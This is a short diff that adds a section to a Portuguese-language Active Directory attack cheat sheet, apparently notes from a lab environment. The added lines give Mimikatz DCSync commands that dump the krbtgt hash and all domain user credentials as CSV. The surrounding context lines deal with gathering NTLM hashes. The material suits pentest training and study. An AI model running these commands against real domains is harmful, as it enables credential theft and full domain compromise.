@@ -2755,3 +2755,12 @@ VAI OBTER OS NTLM HASHES:
 tasklist /v
 tasklist /v | findstr /I svcadmin
 ```
+
+
+
+## MIMIMKATZ  - COMANDOS
+##### MIMIKATZ - DCSYNC
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:dollarcorp.moneycorp.local /all /csv"'
+```
